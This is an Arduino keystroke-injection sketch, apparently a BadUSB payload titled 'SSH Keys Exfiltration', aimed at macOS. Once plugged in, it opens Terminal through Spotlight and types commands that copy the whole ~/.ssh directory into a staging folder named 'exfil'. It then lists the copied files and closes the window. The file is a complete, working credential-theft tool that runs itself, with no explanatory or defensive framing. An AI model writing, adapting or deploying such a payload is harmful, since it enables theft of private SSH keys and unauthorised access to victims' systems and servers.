#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Copy SSH keys from ~/.ssh directory
  // Saves to ~/Documents/exfil/ssh_keys/
  // Author: Generated
  // Title: SSH Keys Exfiltration
  // Target: macOS
  // Version: 1.0
  // Category: Credentials
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir -p ~/Documents/exfil/ssh_keys");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("cp -r ~/.ssh/* ~/Documents/exfil/ssh_keys/ 2>/dev/null || echo 'No SSH keys found' > ~/Documents/exfil/ssh_keys/status.txt");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("ls -la ~/Documents/exfil/ssh_keys/");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}